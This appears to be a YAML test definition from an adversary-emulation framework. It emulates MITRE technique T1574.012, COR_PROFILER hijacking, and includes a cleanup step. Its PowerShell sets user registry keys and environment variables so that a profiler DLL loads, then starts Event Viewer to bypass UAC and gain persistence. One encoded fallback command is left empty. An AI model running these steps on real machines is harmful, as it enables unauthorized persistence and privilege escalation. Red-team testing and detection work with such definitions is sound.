- id: d334111d-5bae-51ce-96d2-b07bceab0ce7
  name: Soumaia ART Tests - User scope COR_PROFILER
  description: 'Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).

    The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.

    Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.

    If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,

    the notepad process will not execute with high integrity.


    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/'
  tactic: stealth
  technique:
    attack_id: T1574.012
    name: 'Hijack Execution Flow: COR_PROFILER'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQA1ADcANAAuADAAMQAyAHgANgA0AC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
          New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value ".\T1574.012x64.dll" -Force | Out-Null
          New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value ".\T1574.012x64.dll" -Force | Out-Null
          Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
          START MMC.EXE EVENTVWR.MSC
        cleanup: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
        payloads:
        - T1574.012x64.dll
